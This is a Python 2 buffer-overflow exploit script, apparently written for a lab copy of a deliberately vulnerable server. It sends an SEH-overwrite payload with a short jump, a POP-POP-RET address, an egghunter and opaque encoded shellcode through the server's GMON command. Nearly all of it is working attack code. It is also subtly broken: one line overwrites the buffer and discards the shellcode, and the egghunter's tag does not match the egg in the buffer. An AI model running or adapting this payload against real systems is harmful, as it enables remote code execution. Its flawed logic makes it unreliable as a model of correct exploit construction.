#!/usr/bin/python

import socket

host = "192.168.196.128"
port = 9999

nSeh = "\xeb\xCE\x90\x90"  #jump back 50byte opcode
Seh = "\xB4\x10\x50\x62"     #625010B4 POP-POP-RET from essfunc.dll

# EGGS
# Size: 32 bytes
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x45\x47\x47\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

shellcode = ("\xda\xd4\xd9\x74\x24\xf4\x58\xbb\xf0\xe6\xb6\x1b\x29\xc9\xb1"
"\x52\x31\x58\x17\x03\x58\x17\x83\x30\xe2\x54\xee\x4c\x03\x1a"
"\x11\xac\xd4\x7b\x9b\x49\xe5\xbb\xff\x1a\x56\x0c\x8b\x4e\x5b"
"\xe7\xd9\x7a\xe8\x85\xf5\x8d\x59\x23\x20\xa0\x5a\x18\x10\xa3"
"\xd8\x63\x45\x03\xe0\xab\x98\x42\x25\xd1\x51\x16\xfe\x9d\xc4"
"\x86\x8b\xe8\xd4\x2d\xc7\xfd\x5c\xd2\x90\xfc\x4d\x45\xaa\xa6"
"\x4d\x64\x7f\xd3\xc7\x7e\x9c\xde\x9e\xf5\x56\x94\x20\xdf\xa6"
"\x55\x8e\x1e\x07\xa4\xce\x67\xa0\x57\xa5\x91\xd2\xea\xbe\x66"
"\xa8\x30\x4a\x7c\x0a\xb2\xec\x58\xaa\x17\x6a\x2b\xa0\xdc\xf8"
"\x73\xa5\xe3\x2d\x08\xd1\x68\xd0\xde\x53\x2a\xf7\xfa\x38\xe8"
"\x96\x5b\xe5\x5f\xa6\xbb\x46\x3f\x02\xb0\x6b\x54\x3f\x9b\xe3"
"\x99\x72\x23\xf4\xb5\x05\x50\xc6\x1a\xbe\xfe\x6a\xd2\x18\xf9"
"\x8d\xc9\xdd\x95\x73\xf2\x1d\xbc\xb7\xa6\x4d\xd6\x1e\xc7\x05"
"\x26\x9e\x12\x89\x76\x30\xcd\x6a\x26\xf0\xbd\x02\x2c\xff\xe2"
"\x33\x4f\xd5\x8a\xde\xaa\xbe\x74\xb6\xb5\xef\x1d\xc5\xb5\x0e"
"\x65\x40\x53\x7a\x89\x05\xcc\x13\x30\x0c\x86\x82\xbd\x9a\xe3"
"\x85\x36\x29\x14\x4b\xbf\x44\x06\x3c\x4f\x13\x74\xeb\x50\x89"
"\x10\x77\xc2\x56\xe0\xfe\xff\xc0\xb7\x57\x31\x19\x5d\x4a\x68"
"\xb3\x43\x97\xec\xfc\xc7\x4c\xcd\x03\xc6\x01\x69\x20\xd8\xdf"
"\x72\x6c\x8c\x8f\x24\x3a\x7a\x76\x9f\x8c\xd4\x20\x4c\x47\xb0"
"\xb5\xbe\x58\xc6\xb9\xea\x2e\x26\x0b\x43\x77\x59\xa4\x03\x7f"
"\x22\xd8\xb3\x80\xf9\x58\xc3\xca\xa3\xc9\x4c\x93\x36\x48\x11"
"\x24\xed\x8f\x2c\xa7\x07\x70\xcb\xb7\x62\x75\x97\x7f\x9f\x07"
"\x88\x15\x9f\xb4\xa9\x3f")


buffer = "EGGSEGGS"
buffer += shellcode
buffer = "A"* (3467-len(buffer))
buffer += egghunter
buffer += "A"*(3515-len(buffer))
buffer += nSeh
buffer += Seh
buffer += "C"*(5000-len(buffer))

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	print s.recv(1024)
	s.send("GMON /.:/" + buffer)
	print s.recv(1024)
	s.close()
except socket.error, e:
    print("Could not connect : %s" % e)
